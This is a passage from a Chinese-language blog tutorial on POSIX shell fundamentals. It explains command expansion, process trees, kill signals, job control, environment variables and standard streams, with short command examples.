<h3 id="◇内部命令-VS-外部命令"><a href="#◇内部命令-VS-外部命令" class="headerlink" title="◇内部命令 VS 外部命令"></a>◇内部命令 VS 外部命令</h3><p>　　（刚才提到了【外部命令】这个词汇，顺便解释一下）<br>　　通俗地说，“内部命令”就是内置在 shell 中的命令；而“外部命令”则对应了某个具体的【可执行文件】。<br>　　当你在 shell 中执行“外部命令”，shell 会启动对应的可执行文件，从而创建出一个“子进程”；而如果是“内部命令”，就【不】产生子进程。<br>　　那么，如何判断某个命令是否为“外部命令”捏？<br>　　比较简单的方法是——用如下方式来帮你查找。如果某个命令能找到对应的可执行文件，就是“外部命令”；反之则是“内部命令”。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whereis</span> 命令名称<br></code></pre></td></tr></table></figure>


<h3 id="◇翻译【通配符】"><a href="#◇翻译【通配符】" class="headerlink" title="◇翻译【通配符】"></a>◇翻译【通配符】</h3><p>　　玩过命令行的同学，应该都知道：“星号”（<code>*</code>）与“问号”（<code>?</code>）可以作为通配符，用来模糊匹配文件名。<br>　　当你在 shell 中执行的命令包含了上述两个通配符，实际上是 shell 先把”通配符“翻译成具体的文件名，然后再传给相应命令。</p>
<h3 id="◇翻译某些【特殊符号】"><a href="#◇翻译某些【特殊符号】" class="headerlink" title="◇翻译某些【特殊符号】"></a>◇翻译某些【特殊符号】</h3><p>　　比如说：在 POSIX 系统中，通常用 <code>~</code> 来表示当前用户的【主目录】（home 目录）。<br>　　如果你在 shell 中用到了 <code>~</code> 这个符号，shell 会先把该符号翻译成“home 目录的【全路径】”，然后再传给相应命令。</p>
<h3 id="◇翻译【别名】"><a href="#◇翻译【别名】" class="headerlink" title="◇翻译【别名】"></a>◇翻译【别名】</h3><p>　　很多 POSIX 的 shell 都支持用 <code>alias</code> 命令设置别名（把一个较长的命令串，用一个较短的别名来表示）。<br>　　设置了别名之后，当你在 shell 中使用“别名”，由 shell 帮你翻译成原先的命令串。</p>
<p>　　举例：<br>俺使用如下命令创建了 <code>nc-tor</code> 这个别名。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>　　设置完之后，当你在 shell 中执行了这个 <code>nc-tor</code> 命令，shell 会把它自动翻译成 <code>nc -X 5 -x 127.0.0.1:9050</code></p>
<h3 id="◇历史命令"><a href="#◇历史命令" class="headerlink" title="◇历史命令"></a>◇历史命令</h3><p>　　大部分 shell 都会记录历史命令。你可以使用某些设定的快捷键（通常是【向上】的方向键），重新运行之前执行过的命令。</p>
<h3 id="◇自动补全"><a href="#◇自动补全" class="headerlink" title="◇自动补全"></a>◇自动补全</h3><p>　　很多 shell 都具备自动补全的功能。<br>　　该功能不仅指“命令”本身的自动补全，还包括对“命令的参数”进行自动补全。</p>
<h3 id="◇操作“环境变量”"><a href="#◇操作“环境变量”" class="headerlink" title="◇操作“环境变量”"></a>◇操作“环境变量”</h3><p>　　关于这部分，在下面的“环境变量”章节单独聊。</p>
<h3 id="◇“管道”与“重定向”"><a href="#◇“管道”与“重定向”" class="headerlink" title="◇“管道”与“重定向”"></a>◇“管道”与“重定向”</h3><p>　　关于这部分，在下面的“管道”章节单独聊。</p>
<h3 id="◇“进程控制”与“作业控制”"><a href="#◇“进程控制”与“作业控制”" class="headerlink" title="◇“进程控制”与“作业控制”"></a>◇“进程控制”与“作业控制”</h3><p>　　关于这部分，在下面的“进程控制”与“作业控制”章节单独聊。</p>
<h2 id="★进程的启动与退出"><a href="#★进程的启动与退出" class="headerlink" title="★进程的启动与退出"></a>★进程的启动与退出</h2><h3 id="◇进程的【启动】及其【父子关系】"><a href="#◇进程的【启动】及其【父子关系】" class="headerlink" title="◇进程的【启动】及其【父子关系】"></a>◇进程的【启动】及其【父子关系】</h3><p>　　一般来说，每个“进程”都是由另一个进程启动滴。如果“进程A”创建了“进程B”，则 A 是【父进程】，B 是【子进程】（这个“父子关系”很好理解——因为完全符合直觉）<br>　　有些同学会问，那最早的【第一个】进程是谁启动滴？<br>　　一般来说，第一个进程由【操作系统内核】（kernel）亲自操刀运行起来；而 kernel 又是由“引导扇区”中的“boot loader”加载。</p>
<h3 id="◇进程树"><a href="#◇进程树" class="headerlink" title="◇进程树"></a>◇进程树</h3><p>　　在 POSIX 系统（Linux ＆ UNIX），所有的进程构成一个【单根树】的层次关系。进程之间的“父子关系”，体现在“进程树”就是树上的【父子节点】。<br>　　你可以使用如下命令，查看当前系统的“进程树”。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree</span><br></code></pre></td></tr></table></figure>


<p><img src="https://lh3.googleusercontent.com/oyi3HQTSxSr8Jyov0B1gGtwvQrjuWsScmpmZamLS8KfpLAIUzUZ5AaZem5fcOnYsAGewJoVKviqGMirk8QVRFfPFC3YYe-Dbh_-czN3M0M_HHgOQh0BvxrGMVPnj6g4wrlmiJZwPVBM" alt="不见图 请翻墙"><br>（“进程树”的效果图。注：为了避免暴露俺的系统信息，特意【不】用自己系统的截图）</p>
<h3 id="◇初始进程"><a href="#◇初始进程" class="headerlink" title="◇初始进程"></a>◇初始进程</h3><p>　　一般情况下，POSIX 系统的“进程树”的【根节点】就是系统开机之后【第一个】创建的进程，并且其进程编号（PID）通常是 1。这个进程称之为“初始进程”。<br>　　（注：上述这句话并【不够】严密——因为某些 UNIX 衍生系统的“进程树”，位于根节点的进程【不是】“初始化进程”。这种情况与本文的主题没太大关系，俺不打算展开讨论）<br>　　对于“大部分 UNIX 衍生系统”以及“2010年之前的 Linux 发行版”，系统中的“初始进程”名叫 <code>init</code>；<br>　　如今越来越多的 Linux 发行版采用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Systemd">systemd</a> 来完成系统引导之后的初始化工作。在这些发行版中，“初始进程”名叫 <code>systemd</code>。</p>
<p>　　你可以用如下命令显示“进程树”中每个节点的“进程编号”（PID），然后就能看到编号为 1 的“初始进程”。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree -p</span><br></code></pre></td></tr></table></figure>


<h3 id="◇进程的三种死法"><a href="#◇进程的三种死法" class="headerlink" title="◇进程的三种死法"></a>◇进程的三种死法</h3><p>　　关于进程如何死亡，大致有如下三种情况：</p>
<p><strong>自然死亡</strong><br>　　如果某个进程把它该干的事情都干完了，自然就会退出。<br>　　这种是最常见的情况，也是最优雅的死法。俺习惯称作【自然死亡】。</p>
<p><strong>自杀</strong><br>　　如果某个进程的工作干到半当中，突然收到某个通知，让它立即退出。<br>　　这时候，进程会赶紧处理一些善后工作，然后自行了断——这就是【自杀】。</p>
<p><strong>它杀</strong><br>　　比“自杀”更粗暴的方式称之为【它杀】。也就是让“操作系统内核”直接把进程干掉。<br>　　在这种情况下，进程【不会】收到任何通知，因此也【不】可能进行任何善后事宜。</p>
<p>　　（注：上述三种死法纯属比喻，以加深大伙儿的印象；不必太较真。十年前俺刚开博客，写过几篇帖子谈“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/02/cxx-object-destroy-overview.html">C++ 对象之死</a>”，也用过类似比喻）<br>　　关于“自杀＆它杀”的方式，会涉及到【信号】。在下一个章节，俺会单独讨论【进程控制】，并会详细介绍“信号”的机制。</p>
<h3 id="◇“孤儿进程”及其“领养”"><a href="#◇“孤儿进程”及其“领养”" class="headerlink" title="◇“孤儿进程”及其“领养”"></a>◇“孤儿进程”及其“领养”</h3><p>　　如果某个进程死了（退出了），而它的子进程还【没】死，那么这些子进程就被形象地称之为“孤儿”，然后会被上述提到的【初始进程】“领养”——“初始进程”作为“孤儿进程”的父进程。<br>　　对应到“进程树”——“孤儿进程”会被重新调整到“进程树根节点”的【直接下级】。</p>
<h2 id="★“进程控制”与“信号”"><a href="#★“进程控制”与“信号”" class="headerlink" title="★“进程控制”与“信号”"></a>★“进程控制”与“信号”</h2><h3 id="◇用【Ctrl-C】杀进程"><a href="#◇用【Ctrl-C】杀进程" class="headerlink" title="◇用【Ctrl + C】杀进程"></a>◇用【Ctrl + C】杀进程</h3><p>　　为了演示这个效果，你可以执行如下命令：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>

<p>　　如果是 Windows 系统里的 <code>ping</code> 命令，它只会进行4次“乒操作”，然后就自己退出了；<br>　　但对于 POSIX 系统里面的 <code>ping</code> 命令，它会永远运行下去（直到被杀掉）。<br>　　当 ping 在运行的时候，只要你按下 <code>Ctrl + C</code> 这个组合键，就可以立即终止这个 <code>ping</code> 进程。</p>
<h3 id="◇“Ctrl-C”背后的原理——【信号】（signal）"><a href="#◇“Ctrl-C”背后的原理——【信号】（signal）" class="headerlink" title="◇“Ctrl + C”背后的原理——【信号】（signal）"></a>◇“Ctrl + C”背后的原理——【信号】（signal）</h3><p>　　当你按下了 <code>Ctrl + C</code> 这个组合键，当前正在执行的进程会收到一个叫做【SIGINT】的信号。<br>　　如果进程内部定义了针对该信号的处理函数，那么就会去执行这个函数，完成该函数定义的一些动作。一般而言，该函数会进行一些善后工作，然后进程退出。<br>　　如果进程【没有】定义相应的处理函数，则会执行一个【默认动作】。对于 SIGINT 这个信号而言，默认动作就是“进程退出”。<br>　　上述这2种情况，都属于前面所说的自杀。这2种属于【常规情况】。</p>
<p>　　下面再来说【特殊情况】——有时候 <code>Ctrl + C</code>【无法】让进程退出。为啥会这样捏？<br>　　假如说，编写某个进程的程序员，定义了该信号的处理函数，但在这个函数内部，并【没有】执行“进程退出”这个动作。那么当该进程收到 SIGINT 信号之后，自然就【不会】退出。这种情况称之为——<strong>信号被该进程【屏蔽】了</strong>。</p>
<h3 id="◇【谁】发出“Ctrl-C”对应的信号？"><a href="#◇【谁】发出“Ctrl-C”对应的信号？" class="headerlink" title="◇【谁】发出“Ctrl + C”对应的信号？"></a>◇【谁】发出“Ctrl + C”对应的信号？</h3><p>　　很多人（包括很多玩命令行的老手）都有一个【误解】——他们误以为是 shell 发送了 SIGINT 信号给当前进程。<strong>其实不然！</strong><br>　　在上述 ping 的例子中，当 ping 进程在持续运行之时，你的键盘输入是关联到 ping 进程的“标准输入”（stdin）。在这种情况下，shell 根本【无法】获取你的按键信息。<br>　　实际上，是【终端】获取了你的 <code>Ctrl + C</code> 组合键信息，并发送了 SIGINT 信号。因为【终端】处于更底层，它负责承载你所有的输入输出。因此，它当然可以截获用户的某个特殊的组合键（比如：<code>Ctrl + C</code>），并执行某些特定的动作。<br>　　聊到这里，大伙儿会发现——<br>如果没有正确理解“终端”与“shell”这两者的关系，就会犯很多错误（造成很多误解）。</p>
<p>　　有的读者可能会问：“终端”如何知道【当前进程】是哪一个？（能想到这点，通常是比较爱思考滴）<br>　　俺来解答一下：<br>　　当 shell 启动了某个进程，它当然可以拿到这个进程的编号（pid），于是 shell 会调用某个系统 API（比如 <code>tcsetpgrp</code>）把“进程编号”与 shell 所属的“终端”关联起来。<br>　　当“终端”需要发送 SIGINT 信号时，再调用另一个系统 API（比如 <code>tcgetpgrp</code>），就可以知道当前进程的编号。</p>
<h3 id="◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL"><a href="#◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL" class="headerlink" title="◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL"></a>◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL</h3><p><strong>SIGINT</strong><br>　　在大部分 POSIX 系统的各种终端上，<code>Ctrl + C</code> 组合键触发的就是这个信号。<br>　　通常情况下，进程收到这个信号后，做完相关的善后工作，就自行了断（自杀）。</p>
<p><strong>SIGTERM</strong><br>　　这个信号基本类似于 SIGINT。<br>　　它是 <code>kill</code> ＆ <code>killall</code> 这两个命令【默认】使用的信号。<br>　　也就是说，当你用这俩命令杀进程，并且【没有】指定信号类型，那么 <code>kill</code> 或 <code>killall</code> 用的就是这个 SIGTERM 信号。</p>
<p><strong>SIGQUIT</strong><br>　　这个信号类似于前两个（SIGINT ＆ SIGINT），差别在于——进程在退出前会执行“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>”操作。<br>　　一般而言，只有程序员才会去关心“core dump”这个玩意儿，所以这里就不细聊了。</p>
<p><strong>SIGKILL</strong><br>　　在杀进程的几个信号中，这个信号是是最牛逼的（也是最粗暴的）。<br>　　前面三个信号都是【可屏蔽】滴，而这个信号是【不可屏蔽】滴。<br>　　当某个进程收到了【SIGKILL】信号，该进程自己【完全没有】处理信号的机会，而是由操作系统内核直接把这个进程干掉。<br>　　此种行为可以形象地称之为“它杀”。<br>　　当你用下列这些命令杀进程，本质上就是在发送这个信号进行【它杀】。【SIGKILL】这个信号的编号是 <code>9</code>，下列这些命令中的 <code>-9</code> 参数就是这么来滴。</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> 进程号<br><span class="hljs-keyword">kill</span> -<span class="hljs-keyword">KILL</span> 进程号<br><br>killall -<span class="hljs-number">9</span> 进程名称<br>killall -<span class="hljs-keyword">KILL</span> 进程名称<br>killall -SIGKILL 进程名称<br></code></pre></td></tr></table></figure>

<p>　　为了方便对照上述这4种，俺放一个表格如下：</p>
<table>
<thead>
<tr>
<th>信号名称</th>
<th>编号</th>
<th>能否屏蔽</th>
<th>默认动作</th>
<th>俗称</th>
</tr>
</thead>
<tbody><tr>
<td>SIGINT</td>
<td>2</td>
<td>YES</td>
<td>进程自己退出</td>
<td>自杀</td>
</tr>
<tr>
<td>SIGTERM</td>
<td>15</td>
<td>YES</td>
<td>进程自己退出</td>
<td>自杀</td>
</tr>
<tr>
<td>SIGQUIT</td>
<td>3</td>
<td>YES</td>
<td>执行 core dump 进程自己退出</td>
<td>自杀</td>
</tr>
<tr>
<td>SIGKILL</td>
<td>9</td>
<td>NO</td>
<td>进程被内核干掉</td>
<td>它杀</td>
</tr>
</tbody></table>
<h3 id="◇【它杀】的危险性与副作用"><a href="#◇【它杀】的危险性与副作用" class="headerlink" title="◇【它杀】的危险性与副作用"></a>◇【它杀】的危险性与副作用</h3><p>　　请注意：<strong>【它杀】是一种比较危险的做法，可能导致一些【副作用】。</strong>只有当你用其它各种方式都无法干掉某个进程，才考虑用这招。<br>　　有读者在评论区问到了“它杀的副作用”，俺简单解释一下：<br>　　一方面，当操作系统用这种方式杀掉某个进程，虽然可以把很多内存相关的资源释放掉，但【内存之外】的资源，内核就管不了啦；另一方面，由于进程遭遇“它杀”，无法完成某些善后工作。<br>　　基于上述两点，就【有可能】会产生副作用。另外，“副作用的严重程度”取决于不同类型的软件。无法一概而论。</p>
<p><strong>举例1：</strong><br>　　某个进程正在保存文件。这时候遭遇“它杀”可能会导致文件损坏。<br>　　（注：虽然某些操作系统能做到“写操作的原子性”，但数据存储可能会涉及多个写操作。当进程在作【多个】关键性写操作时，遭遇它杀。可能导致数据文件【逻辑上】的损坏）</p>
<p><strong>举例2：</strong><br>　　还有更复杂的情况，比如涉及跨主机的网络通讯。某个进程可能向【远程】的某个网络服务分配了某个远程的资源，当进程“自然死亡 or 自杀”，它会在“善后工作”释放这个资源；而如果死于内核的“它杀”，这个远程的资源就【没】释放。</p>
<h3 id="◇kill-VS-killall"><a href="#◇kill-VS-killall" class="headerlink" title="◇kill VS killall"></a>◇kill VS killall</h3><p>　　这两个的差别在于——前者用“进程号”，后者用”进程名“（也就是可执行文件名）。<br>　　对于新手而言，<br>如果用 <code>kill</code> 命令，你需要先用 <code>ps</code> 命令打印出当前进程清单，然后找到你要杀的进程的编号；而如果要用 <code>killall</code> 命令，就比较省事（比较傻瓜化）。但万一碰到有多个【同名】进程在运行，而你只想干掉其中一个，那么就得老老实实用 <code>kill</code> 了。</p>
<h3 id="◇进程退出码"><a href="#◇进程退出码" class="headerlink" title="◇进程退出码"></a>◇进程退出码</h3><p>　　任何一个进程退出的时候，都对应某个【整数类型】的“退出码”。<br>　　按照 POSIX 系统（UNIX ＆ Linux）的传统惯例——<br>当“退出码”为【零】，表示“成功 or 正常状态”；<br>当“退出码”【非零】，表示“失败 or 异常状态”。</p>
<h3 id="◇暂停进程"><a href="#◇暂停进程" class="headerlink" title="◇暂停进程"></a>◇暂停进程</h3><p>　　刚才聊“杀进程”的时候提到了“自杀 VS 它杀”。前者比较“温柔”；而后者比较“粗暴”。<br>　　对于暂停进程，也有“温柔 ＆ 野蛮”两种玩法。而且也是用 <code>kill</code> 命令发信号。</p>
<p><strong>【温柔】式暂停（SIGTSTP）</strong></p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">kill</span> -<span class="hljs-keyword">TSTP</span> 进程编号<br></code></pre></td></tr></table></figure>
<p>　　这个【SIGTSTP】信号类似前面提及的【SIGINT】——<br>\1. 两者默认都绑定到组合键（【SIGINT】默认绑定到组合键【<code>Ctrl + C</code>】；【SIGTSTP】默认绑定到组合键【<code>Ctrl + Z</code>】）<br>\2. 这两个快捷键都是由【终端】截获，并发出相应的信号（具体原理参见本章节的某个小节）<br>\3. 两者都是【可】屏蔽的信号。也就是说，如果某个进程屏蔽了【SIGTSTP】信号，你就【无法】用该方式暂停它。这时候你就得改用【粗暴】的方式（如下）。</p>
<p><strong>【粗暴】式暂停（SIGSTOP）</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -STOP 进程编号<br></code></pre></td></tr></table></figure>
<p>　　这个【SIGSTOP】信号与前面提及的【SIGKILL】有某种相同之处——这两个信号都属于【不可屏蔽】的信号。也就是说，收到【SIGSTOP】信号的进程【无法】抗拒被暂停（suspend）的命运。</p>
<p>　　与“杀进程”的风格类似——当你想要暂停某进程，应该先尝试“温柔”的方法，搞不定再用“粗暴”的方法（套用咱们天朝的老话叫“先礼后兵”）。</p>
<h3 id="◇恢复进程"><a href="#◇恢复进程" class="headerlink" title="◇恢复进程"></a>◇恢复进程</h3><p>　　当你想要重新恢复（resume）被暂停的进程，就用如下命令（该命令发送信号【SIGCONT】）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -CONT 进程编号<br></code></pre></td></tr></table></figure>


<h3 id="◇引申阅读"><a href="#◇引申阅读" class="headerlink" title="◇引申阅读"></a>◇引申阅读</h3><p>　　除了前面几个小节提到的信号，POSIX 系统还支持其它一些信号，具体参见维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Signal_(IPC)">这个页面</a>”。</p>
<h2 id="★作业控制（job）"><a href="#★作业控制（job）" class="headerlink" title="★作业控制（job）"></a>★作业控制（job）</h2><p>　　聊完了“进程控制”，再来聊“作业控制”。<br>　　（注：这里所说的“作业”是从洋文 job 翻译过来滴）</p>
<h3 id="◇啥是“作业”？"><a href="#◇啥是“作业”？" class="headerlink" title="◇啥是“作业”？"></a>◇啥是“作业”？</h3><p>　　“作业”是 shell 相关的术语，用来表示【进程组】的概念（每个作业就是一组进程）。<br>　　比如说，当你用“管道符”把若干命令串起来执行，这几个命令对应的进程就被视作【一组】。<br>　　（注：“管道符”的用法，后面某个章节会介绍）</p>
<h3 id="◇同步执行（前台执行）-VS-异步执行（后台执行）"><a href="#◇同步执行（前台执行）-VS-异步执行（后台执行）" class="headerlink" title="◇同步执行（前台执行） VS 异步执行（后台执行）"></a>◇同步执行（前台执行） VS 异步执行（后台执行）</h3><p>　　大部分情况下，你在 shell 中执行的命令都是“同步执行”（或者叫“前台执行”）。对于这种方式，只有当命令运行完毕，你才会重新看到 shell 的“命令行提示符”。<br>　　如果你以“异步执行”的方式启动某个外部命令，在这个命令还没有执行完的时候，你就可以重新看到“命令行提示符”。</p>
<p>　　请注意：<br>　　对于【短】寿命的外部命令（耗时很短的外部命令），“同步/异步”两种方式其实【没】啥区别。比如 <code>ls</code> 命令通常很快就执行完毕，你就感觉不到上述两种方式的差异。<br>　　只有当你执行了某个【长】寿命的外部命令（其执行时间至少达到若干秒），上述这两种方式才会体现出差别。</p>
<p>　　到目前为止，本文之前聊的命令执行方式，都属于“同步执行”；如果想用【异步】，需要在整个命令的最末尾追加一个半角的 <code>&amp;</code> 符号。</p>
<p><strong>【同步】方式举例</strong><br>　　下列命令以【同步】的方式启动火狐浏览器，只有当你关闭了火狐，才会重新看到 shell 的命令行提示符。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">firefox</span><br></code></pre></td></tr></table></figure>

<p><strong>【异步】方式举例</strong><br>　　下列命令以【异步】的方式启动火狐浏览器。你刚敲完回车，就会重新看到 shell 的“命令行提示符”（此时火狐依然在运行）</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">firefox <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure>

<p>　　以“同步”方式启动的进程，称作“【前台】进程”；反之，以“异步”方式启动的进程，称作“【后台】进程”。</p>
<h3 id="◇“前台”切换到“后台”"><a href="#◇“前台”切换到“后台”" class="headerlink" title="◇“前台”切换到“后台”"></a>◇“前台”切换到“后台”</h3><p>　　假设当前的 shell 正在执行某个长寿命的【前台】进程，你可以按【<code>Ctrl + Z</code>】，就可以让该进程变为【后台】进程——此时你立即可以看到“命令提示符”。<br>　　只要你不是太健忘，应该记得前一个章节有提到过【<code>Ctrl + Z</code>】这个组合键——它用来实现”【温柔】式暂停“，其原理是：向目标进程发送【SIGTSTP】信号。</p>
<h3 id="◇“后台”切换到“前台”"><a href="#◇“后台”切换到“前台”" class="headerlink" title="◇“后台”切换到“前台”"></a>◇“后台”切换到“前台”</h3><p>　　假设当前 shell 正在执行某个后台进程。由于该进程在【后台】执行，此时有“命令提示符”，然后你在 shell 中执行 <code>fg</code> 命令，就可以把该后台进程切换到【前台】。</p>
<p>　　某些爱思考的同学会问了——如果同时启动了【多个】“后台进程”，<code>fg</code> 命令会切换哪一个捏？<br>　　在这种情况下，<code>fg</code> 命令切换的是【最后启动】的那个。</p>
<p>　　如果你有 N 个“后台进程”，你想把其中的某个切换为“前台进程”，这时候就需要用到 <code>jobs</code> 命令。该命令与乔布斯同名 :)<br>　　举例：<br>　　假设俺同时启动了 vim 与 emacs 作为后台进程，先用 <code>jobs</code> 命令列出所有的后台进程。假设该命令的输出是如下这个样子。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ jobs<br><span class="hljs-string">[1]</span>  running    vim<br><span class="hljs-string">[2]</span>  running    emacs<br></code></pre></td></tr></table></figure>
<p>　　在上述的终端窗口，中括号里面的数字称作“job id”。你可以用 <code>fg</code> 命令搭配“job id”，把某个后台进程切换到前台。<br>　　（在本例中）如果你想切换 emacs 到前台，就运行 <code>fg %2</code>，如果想切换 vim 就运行 <code>fg %1</code>（以此类推）</p>
<h3 id="◇引申阅读-1"><a href="#◇引申阅读-1" class="headerlink" title="◇引申阅读"></a>◇引申阅读</h3><p>　　想进一步了解“作业控制”，可以参考维基百科（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Job_control_(Unix)">这个链接</a>）。</p>
<h2 id="★环境变量（environment-variable）"><a href="#★环境变量（environment-variable）" class="headerlink" title="★环境变量（environment variable）"></a>★环境变量（environment variable）</h2><h3 id="◇“环境变量”是啥？"><a href="#◇“环境变量”是啥？" class="headerlink" title="◇“环境变量”是啥？"></a>◇“环境变量”是啥？</h3><p>　　所谓的“环境变量”，你可以通俗理解为某种【名值对】——每个“环境变量”都有自己的【名称】和【值】。并且名称必须是【唯一】滴。</p>
<h3 id="◇如何添加并修改“环境变量”？"><a href="#◇如何添加并修改“环境变量”？" class="headerlink" title="◇如何添加并修改“环境变量”？"></a>◇如何添加并修改“环境变量”？</h3><p>　　在 bash（或兼容 bash 的其它 shell），你可以用 <code>export</code> 设置环境变量。比如下面这个命令行设置了一个“环境变量”，其名称是 <code>abc</code>，其值是 <code>xyz</code></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">abc</span>=xyz<br></code></pre></td></tr></table></figure>

<p>　　假如你要设置的【值】包含空格，记得用双引号引用该值（示例如下）。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">abc</span>=<span class="hljs-string">&quot;program think&quot;</span><br></code></pre></td></tr></table></figure>

<p>　　由于“环境变量”的名称具有【唯一性】，当你设置【同名】的“环境变量”就等同于对它的【修改】。</p>
<h3 id="◇如何查看“环境变量”？"><a href="#◇如何查看“环境变量”？" class="headerlink" title="◇如何查看“环境变量”？"></a>◇如何查看“环境变量”？</h3><p>　　设置完之后，你可以用 <code>env</code> 命令查看。该命令会列出【当前 shell】中的【全部】“环境变量”。</p>
<h3 id="◇“环境变量”的【可见性】和【可继承性】"><a href="#◇“环境变量”的【可见性】和【可继承性】" class="headerlink" title="◇“环境变量”的【可见性】和【可继承性】"></a>◇“环境变量”的【可见性】和【可继承性】</h3><p>　　某个进程设置的“环境变量”，其【可见性】仅限于该进程及其子进程（也就是“进程树”中，该进程所在的那个枝节）。<br>　　基于上述的【可见性】原则，你在某个 shell 中设置的“环境变量”，只在“该 shell 进程本身”，以及通过该 shell 进程启动的“其它子进程”，才能看到。</p>
<p>　　另外，如果系统关机，所有进程都会退出，那么你采用上一个小节（export 方式）设置的“环境变量”也就随之消失了。<br>　　为了让某个“环境变量”永久生效，需要把相应的 <code>export</code> 命令添加到该 shell 的初始化配置文件中。对于 bash 而言，也就是 <code>~/.bashrc</code> 或者 <code>~/.profile</code><br>　　估计有些同学会问：上述这两个初始化配置文件，有啥差别捏？<br>　　俺如果有空，会单独写一篇关于 bash 的定制教程，到时候再聊这个话题。</p>
<h3 id="◇“环境变量”有啥用？"><a href="#◇“环境变量”有啥用？" class="headerlink" title="◇“环境变量”有啥用？"></a>◇“环境变量”有啥用？</h3><p>　　通俗地说，“环境变量”是某种比较简单的“IPC 机制”（进程通讯机制），可以让两个进程共享某个简单的文本信息。<br>　　举例：<br>　　很多知名的软件（比如：curl、emacs）都支持“以环境变量设置代理”。<br>　　如果你按照它的约定，在 shell 中设置了约定名称和格式的“环境变量”，然后在【同一个】shell 中启动这个软件，（由于环境变量的【可继承性】）该软件就会看到这个“环境变量”，并根据“环境变量”包含的信息，设置代理。</p>
<h2 id="★“标准流”（standard-stream）与“重定向”（redirection）"><a href="#★“标准流”（standard-stream）与“重定向”（redirection）" class="headerlink" title="★“标准流”（standard stream）与“重定向”（redirection）"></a>★“标准流”（standard stream）与“重定向”（redirection）</h2><h3 id="◇进程的3个“标准流”"><a href="#◇进程的3个“标准流”" class="headerlink" title="◇进程的3个“标准流”"></a>◇进程的3个“标准流”</h3><p>　　在 POSIX 系统（Linux ＆ UNIX）中，每个进程都内置了三个“标准流”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Standard_streams">standard stream</a>），分别称作：“标准输入流”（stdin），“标准输出流”（stdout），“标准错误输出流”（stderr）。<br>　　当进程启动后，在默认情况下，stdin 对接到终端的【输入】；stdout ＆ stderr 对接到终端的【输出】。示意图如下：</p>
<p><img src="https://lh4.googleusercontent.com/JEfAB2UXDSRwczojJZOXEDAK5xH4E6YdksxZuIqq_5Tfe6xjwHrbeYX5EETlsHxQYk1Wm_wXg-ajpjIu3lHzYLeYJML5xxQQgsuhnZodUcC5jbtdLQ7_AflDdUkEfAthqHqBly3CQPo" alt="不见图 请翻墙"><br>（三个【标准流】的示意图）</p>
<p>　　如果你是程序员，俺补充一下：<br>　　当你在程序中打开某个文件，会得到一个“文件描述符”（洋文叫“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a>”，简称 fd）。fd 本身是个整数，程序员可以通过 fd 对该文件进行读写。<br>　　而进程的三个【标准流】，就相当于是三个特殊的 fd。当进程启动时，操作系统就已经把这三个 fd 准备好了。<br>　　由于这三个玩意儿是预先备好滴，所以它们的数值分别是：0、1、2（参见上图中 # 后面的数字）。</p>
<h3 id="◇演示“标准流”的实际效果"><a href="#◇演示“标准流”的实际效果" class="headerlink" title="◇演示“标准流”的实际效果"></a>◇演示“标准流”的实际效果</h3><p>　　在本文前面的某个章节，俺已经用 gif 动画演示了终端的“行模式”。<br>　　动画中的 <code>cat</code> 命令同样可以用来演示“标准输入输出”。俺把那个动画再贴一次。</p>
